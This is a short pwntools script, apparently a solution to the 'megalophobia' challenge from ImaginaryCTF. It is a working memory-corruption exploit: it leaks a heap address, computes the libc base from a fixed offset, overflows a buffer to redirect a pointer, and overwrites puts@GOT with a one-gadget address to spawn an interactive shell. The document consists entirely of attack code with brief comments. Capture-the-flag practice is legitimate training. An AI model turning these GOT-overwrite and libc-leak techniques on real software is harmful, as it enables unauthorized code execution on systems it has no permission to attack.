from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
elf = ELF("./megalophobia")

io = process("./megalophobia")
# io = gdb.debug(
#     "./megalophobia",
#     "b *(main+23)\nb *(main+37)\nb *(main+250)\nb *(main+295)\nb *(main+340)\nc",
# )
# io = remote("megalophobia.chal.imaginaryctf.org", 42043)
io.sendlineafter(b"shout?", b"aaaa")
io.recvuntil(b"at ")
heap = int(io.recvlineS().strip()[:-1], 16)
print(f"{heap = :#x}")
libc = heap + 0xFFFFA99  # mmap address has a fixed offset from libc
print(f"{libc = :#x}")
gadget = libc + 0xE6C81
print(f"{gadget = :#x}")
io.sendlineafter(b"shout?", b"bbbb")
print("write to", hex(elf.got["puts"]))
io.sendlineafter(
    b"Name?", b"cccccccc" + p64(elf.got["puts"])
)  # overflow to write next pointer in buf2
io.sendlineafter(b"Age?", b"peko")  # no use
print("write gadget")
io.sendlineafter(b"number?", p64(gadget))  # write to puts@got
io.interactive()
